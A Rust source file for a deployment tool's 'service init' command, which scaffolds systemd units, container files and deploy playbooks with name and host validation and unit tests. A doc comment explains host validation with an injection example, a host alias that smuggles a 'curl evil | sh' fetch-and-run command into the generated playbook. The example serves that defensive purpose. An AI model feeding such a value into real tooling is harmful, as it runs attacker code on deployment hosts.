//! `shellflow service init` — scaffold a new service in the flat layout.
//!
//! Generates the three files a new service needs in the current repository:
//!
//! ```text
//! services/<svc>/<svc>.json5.tmpl   # plaintext config template (${KEY} placeholders)
//! services/<svc>/<svc>.service      # systemd unit (shared cred-env helper)
//! playbooks/deploy-<svc>.sh         # deploy playbook skeleton
//! ```
//!
//! The generated content encodes the documented convention (see SKILL.md
//! §4.1): flat service directory, per-host encrypted env, per-service
//! credential store, shared hardening drop-in, and the shared target-side
//! `cred-env` helper instead of a per-service starter script.

use std::{
    fs,
    path::{Path, PathBuf},
};

use eyre::{Context, Result, bail};

use crate::cli::{ServiceCmd, ServiceInitArgs, ServicePattern};

/// The config template (token `__SVC__`).
const CONFIG_TEMPLATE: &str = include_str!("../assets/service-config.tmpl");

/// The systemd unit (token `__SVC__`).
const UNIT_TEMPLATE: &str = include_str!("../assets/service-unit.tmpl");

/// The systemd unit, env-export variant (token `__SVC__`).
const UNIT_EXEC_TEMPLATE: &str = include_str!("../assets/service-unit-exec.tmpl");

/// The systemd unit, no-secrets variant (token `__SVC__`).
const UNIT_NOSECRET_TEMPLATE: &str = include_str!("../assets/service-unit-nosecret.tmpl");

/// The quadlet container (token `__SVC__`).
const CONTAINER_TEMPLATE: &str = include_str!("../assets/service-container.tmpl");

/// The container env template (token `__SVC__`).
const CONTAINER_ENV_TEMPLATE: &str = include_str!("../assets/service-container-env.tmpl");

/// The systemd unit, oneshot variant (token `__SVC__`).
const UNIT_ONESHOT_TEMPLATE: &str = include_str!("../assets/service-unit-oneshot.tmpl");

/// The systemd timer (tokens `__SVC__`, `__SCHEDULE__`).
const TIMER_TEMPLATE: &str = include_str!("../assets/service-timer.tmpl");

/// The deploy playbook (tokens `__SVC__`, `__SERVER_LINES__`, `__HOST__`).
const PLAYBOOK_TEMPLATE: &str = include_str!("../assets/service-playbook.tmpl");

/// The deploy playbook, no-secrets variant.
const PLAYBOOK_NOSECRET_TEMPLATE: &str = include_str!("../assets/service-playbook-nosecret.tmpl");

/// The deploy playbook, quadlet variant.
const PLAYBOOK_CONTAINER_TEMPLATE: &str = include_str!("../assets/service-playbook-container.tmpl");

/// The deploy playbook, oneshot variant (tokens `__TIMER_INSTALL__`, `__TIMER_ENABLE__`).
const PLAYBOOK_ONESHOT_TEMPLATE: &str = include_str!("../assets/service-playbook-oneshot.tmpl");

/// The deploy playbook, no-start variant.
const PLAYBOOK_NOSTART_TEMPLATE: &str = include_str!("../assets/service-playbook-nostart.tmpl");

/// Files generated for one pattern: (repo path, content).
struct Scaffold {
    files: Vec<(PathBuf, String, bool)>,
    next_steps: Vec<String>,
}

/// Scaffold a service.
///
/// # Errors
///
/// Returns when the service name is unusable, when any target path already
/// exists (never overwrites), or on I/O failures.
pub(crate) fn run(cmd: &ServiceCmd) -> Result<()> {
    match cmd {
        ServiceCmd::Init(args) => init(args),
        ServiceCmd::Check(args) => crate::service_check::check(args),
    }
}

/// Scaffold a service (`service init`).
fn init(cmd: &ServiceInitArgs) -> Result<()> {
    let service = cmd.service.trim();
    // Validate before touching the filesystem, and validate every value that
    // reaches the generated playbook.
    validate_service_name(service)?;
    let mut hosts: Vec<String> = Vec::new();
    for raw in &cmd.hosts {
        let host = raw.trim();
        if host.is_empty() {
            continue;
        }
        validate_host_alias(host)?;
        hosts.push(host.to_string());
    }
    if hosts.is_empty() {
        hosts.push("api".to_string());
    }
    if cmd.pattern == ServicePattern::Oneshot && cmd.timer.is_none() {
        // A timer is optional; without one the unit is a run-once task.
    }

    let dir = PathBuf::from(format!("services/{service}"));
    let scaffold = build_scaffold(cmd.pattern, service, &hosts, cmd.timer.as_deref())?;
    for (path, _, _) in &scaffold.files {
        if path.exists() {
            bail!("refusing to overwrite existing `{}`", path.display());
        }
    }

    fs::create_dir_all(&dir).wrap_err_with(|| format!("failed to create `{}`", dir.display()))?;
    for (path, content, executable) in &scaffold.files {
        if *executable {
            write_executable(path, content)?;
        } else {
            write_file(path, content)?;
        }
    }

    println!("==> scaffolded (pattern {:?}):", cmd.pattern);
    for (path, _, _) in &scaffold.files {
        println!("    {}", path.display());
    }
    println!("==> next:");
    for step in &scaffold.next_steps {
        println!("    {step}");
    }
    Ok(())
}

/// Render the shared playbook header tokens.
fn playbook_body(template: &str, service: &str, hosts: &[String]) -> String {
    let server_lines =
        hosts.iter().map(|h| format!("# @server {h:<8} {h}")).collect::<Vec<_>>().join("\n");
    template
        .replace("__SERVER_LINES__", server_lines.trim_end())
        .replace("__HOST__", &hosts[0])
        .replace("__SVC__", service)
}

/// Build the file set for a pattern.
fn build_scaffold(
    pattern: ServicePattern,
    service: &str,
    hosts: &[String],
    timer: Option<&str>,
) -> Result<Scaffold> {
    let dir = PathBuf::from(format!("services/{service}"));
    let playbook = PathBuf::from(format!("playbooks/deploy-{service}.sh"));
    let host = &hosts[0];
    let render = |t: &str| t.replace("__SVC__", service);
    Ok(match pattern {
        ServicePattern::Full => Scaffold {
            files: vec![
                (dir.join(format!("{service}.json5.tmpl")), render(CONFIG_TEMPLATE), false),
                (dir.join(format!("{service}.service")), render(UNIT_TEMPLATE), false),
                (playbook, playbook_body(PLAYBOOK_TEMPLATE, service, hosts), true),
            ],
            next_steps: vec![
                format!("{{ printf 'KEY=...\\n'; }} | shellflow secret encrypt -r \"$(cat keys/recipients/*.pub)\" -o services/{service}/{host}.env.age"),
                format!("shellflow secret keys-check services/{service}"),
                format!("shellflow template check services/{service}/{service}.json5.tmpl services/{service}/{host}.env.age"),
                format!("shellflow template render --format toml services/{service}/{service}.json5.tmpl services/{service}/{host}.env.age"),
                format!("shellflow secret creds --store-dir /etc/credstore.encrypted/{service} services/{service}/{host}.env.age"),
            ],
        },
        ServicePattern::Exec => Scaffold {
            files: vec![
                (dir.join(format!("{service}.service")), render(UNIT_EXEC_TEMPLATE), false),
                (
                    playbook,
                    playbook_body(PLAYBOOK_TEMPLATE, service, hosts).replace(
                        "sudo install -m 0644 \"${WORKDIR}/svc/${SVC}.json5.tmpl\" \"/opt/${SVC}/etc/${SVC}.json5.tmpl\"\n",
                        "# No config template in exec pattern (env only).\n",
                    ),
                    true,
                ),
            ],
            next_steps: vec![
                format!("{{ printf 'KEY=...\\n'; }} | shellflow secret encrypt -r \"$(cat keys/recipients/*.pub)\" -o services/{service}/{host}.env.age"),
                format!("shellflow secret keys-check services/{service}"),
                format!("shellflow secret creds --store-dir /etc/credstore.encrypted/{service} services/{service}/{host}.env.age"),
            ],
        },
        ServicePattern::NoSecret => Scaffold {
            files: vec![
                (dir.join(format!("{service}.service")), render(UNIT_NOSECRET_TEMPLATE), false),
                (playbook, playbook_body(PLAYBOOK_NOSECRET_TEMPLATE, service, hosts), true),
            ],
            next_steps: vec![
                "paste the live unit over the skeleton, keeping ExecStart paths".to_string(),
                format!("shellflow -k playbooks/deploy-{service}.sh"),
            ],
        },
        ServicePattern::Container => Scaffold {
            files: vec![
                (dir.join(format!("{service}.container")), render(CONTAINER_TEMPLATE), false),
                (dir.join("container.env.tmpl"), render(CONTAINER_ENV_TEMPLATE), false),
                (playbook, playbook_body(PLAYBOOK_CONTAINER_TEMPLATE, service, hosts), true),
            ],
            next_steps: vec![
                format!("{{ printf 'KEY=...\\n'; }} | shellflow secret encrypt -r \"$(cat keys/recipients/*.pub)\" -o services/{service}/{host}.env.age"),
                format!("shellflow secret keys-check services/{service}"),
                format!("shellflow template check services/{service}/container.env.tmpl services/{service}/{host}.env.age"),
                format!("shellflow secret creds --store-dir /etc/credstore.encrypted/{service} services/{service}/{host}.env.age"),
            ],
        },
        ServicePattern::Oneshot => {
            let timer_file = timer.map(|schedule| {
                (
                    dir.join(format!("{service}.timer")),
                    TIMER_TEMPLATE
                        .replace("__SVC__", service)
                        .replace("__SCHEDULE__", schedule),
                    false,
                )
            });
            let timer_install = timer.map_or(
                "# No timer requested (pass --timer to add one).",
                |_| "sudo install -m 0644 \"${WORKDIR}/svc/${SVC}.timer\" \"/etc/systemd/system/${SVC}.timer\"",
            );
            let timer_enable = timer.map_or(
                "# No timer requested (pass --timer to add one).",
                |_| "sudo systemctl enable \"${SVC}.timer\"",
            );
            let body = playbook_body(PLAYBOOK_ONESHOT_TEMPLATE, service, hosts)
                .replace("__TIMER_INSTALL__", timer_install)
                .replace("__TIMER_ENABLE__", timer_enable);
            let mut files = vec![
                (dir.join(format!("{service}.service")), render(UNIT_ONESHOT_TEMPLATE), false),
                (playbook, body, true),
            ];
            if let Some(timer_file) = timer_file {
                files.insert(1, timer_file);
            }
            Scaffold {
                files,
                next_steps: vec![
                    "paste the task command over the ExecStart placeholder".to_string(),
                    format!("shellflow -k playbooks/deploy-{service}.sh"),
                ],
            }
        }
        ServicePattern::NoStart => Scaffold {
            files: vec![
                (
                    dir.join(format!("{service}.service")),
                    "# TODO: paste the live unit here (sudo systemctl cat "
                        .to_string()
                        + service
                        + ".service), keeping paths as-is.\n",
                    false,
                ),
                (playbook, playbook_body(PLAYBOOK_NOSTART_TEMPLATE, service, hosts), true),
            ],
            next_steps: vec![
                "paste the live unit over the TODO placeholder (never start it from here)".to_string(),
                format!("shellflow -k playbooks/deploy-{service}.sh"),
            ],
        },
    })
}

/// Validate the service name: it becomes a directory and a path component.
fn validate_service_name(service: &str) -> Result<()> {
    let valid = !service.is_empty() &&
        service.starts_with(|c: char| c.is_ascii_lowercase()) &&
        service.chars().all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || c == '-') &&
        !service.contains("--");
    if !valid {
        bail!("invalid service name `{service}` (want [a-z][a-z0-9-]*)");
    }
    Ok(())
}

/// Validate a `--host` value: it becomes a server alias, a `@copy`/`@remote`
/// target, and a line of generated shell.
///
/// Whitespace and newlines are rejected because the value is interpolated
/// straight into `playbooks/deploy-<svc>.sh` (`__SERVER_LINES__`,
/// `__HOST__`) without escaping. Without this check, a host such as
/// `api\ncurl evil | sh` injects commands into the generated playbook's
/// **executable body**, not just into its comment lines.
fn validate_host_alias(host: &str) -> Result<()> {
    let valid = !host.is_empty() &&
        host.chars().all(|c| c.is_ascii_alphanumeric() || matches!(c, '-' | '_' | '.'));
    if !valid {
        bail!("invalid host alias `{host}` (want [A-Za-z0-9._-]+, no whitespace)");
    }
    Ok(())
}

/// Write a file, creating parent directories.
fn write_file(path: &Path, content: &str) -> Result<()> {
    if let Some(parent) = path.parent() {
        fs::create_dir_all(parent)
            .wrap_err_with(|| format!("failed to create `{}`", parent.display()))?;
    }
    fs::write(path, content).wrap_err_with(|| format!("failed to write `{}`", path.display()))
}

/// Write a file with mode 0755 (playbooks are executed directly).
fn write_executable(path: &Path, content: &str) -> Result<()> {
    write_file(path, content)?;
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt as _;
        fs::set_permissions(path, fs::Permissions::from_mode(0o755))
            .wrap_err_with(|| format!("failed to chmod `{}`", path.display()))?;
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::{build_scaffold, validate_service_name};
    use crate::cli::ServicePattern;

    fn files(pattern: ServicePattern) -> Vec<String> {
        build_scaffold(pattern, "myapp", &["api".to_string()], None)
            .expect("scaffold")
            .files
            .into_iter()
            .map(|(p, _, _)| p.to_string_lossy().into_owned())
            .collect()
    }

    #[test]
    fn full_pattern_generates_three_files() {
        let f = files(ServicePattern::Full);
        assert!(f.iter().any(|p| p.ends_with("myapp.json5.tmpl")));
        assert!(f.iter().any(|p| p.ends_with("myapp.service")));
        assert!(f.iter().any(|p| p.ends_with("deploy-myapp.sh")));
    }

    #[test]
    fn full_playbook_has_hardening_lessons() {
        let body = build_scaffold(ServicePattern::Full, "myapp", &["api".to_string()], None)
            .expect("scaffold")
            .files
            .into_iter()
            .find(|(p, _, _)| p.to_string_lossy().ends_with(".sh"))
            .expect("playbook")
            .1;
        assert!(body.contains("/usr/local/bin/shellflow cred-env credstore-install"));
        assert!(
            !body.contains("sudo -E /usr/local/bin/shellflow")
                && !body.contains("sudo /usr/local/bin/shellflow cred-env credstore-install"),
            "self-elevation: playbook calls credstore-install without sudo"
        );
        assert!(body.contains("SVC=\"${SVC:-myapp}\""));
        assert!(body.contains("/opt/${SVC}/etc/"));
    }

    #[test]
    fn exec_pattern_has_no_template() {
        let f = files(ServicePattern::Exec);
        assert_eq!(f.len(), 2);
        assert!(f.iter().any(|p| p.ends_with("myapp.service")));
    }

    #[test]
    fn nosecret_pattern_has_no_secrets_directive() {
        let body = build_scaffold(ServicePattern::NoSecret, "myapp", &["api".to_string()], None)
            .expect("scaffold")
            .files
            .into_iter()
            .find(|(p, _, _)| p.to_string_lossy().ends_with(".sh"))
            .expect("playbook")
            .1;
        assert!(!body.contains("@secrets"));
        assert!(body.contains("verify complete"));
    }

    #[test]
    fn container_pattern_generates_container_files() {
        let f = files(ServicePattern::Container);
        assert!(f.iter().any(|p| p.ends_with("myapp.container")));
        assert!(f.iter().any(|p| p.ends_with("container.env.tmpl")));
    }

    #[test]
    fn oneshot_pattern_with_timer() {
        let f = build_scaffold(
            ServicePattern::Oneshot,
            "myapp",
            &["api".to_string()],
            Some("*-*-* 03:00:00"),
        )
        .expect("scaffold")
        .files
        .into_iter()
        .map(|(p, _, _)| p.to_string_lossy().into_owned())
        .collect::<Vec<_>>();
        assert!(f.iter().any(|p| p.ends_with("myapp.timer")));
        assert!(f.iter().any(|p| p.ends_with("myapp.service")));
    }

    #[test]
    fn nostart_pattern_never_starts() {
        let body = build_scaffold(ServicePattern::NoStart, "myapp", &["api".to_string()], None)
            .expect("scaffold")
            .files
            .into_iter()
            .find(|(p, _, _)| p.to_string_lossy().ends_with(".sh"))
            .expect("playbook")
            .1;
        assert!(body.contains("NEVER start"));
        assert!(!body.contains("systemctl restart"));
    }

    #[test]
    fn service_name_validation() {
        assert!(validate_service_name("api").is_ok());
        assert!(validate_service_name("secret-app").is_ok());
        assert!(validate_service_name("zenoh").is_ok());
        assert!(validate_service_name("").is_err());
        assert!(validate_service_name("Api").is_err());
        assert!(validate_service_name("../etc").is_err());
        assert!(validate_service_name("a b").is_err());
        assert!(validate_service_name("a/b").is_err());
    }
}
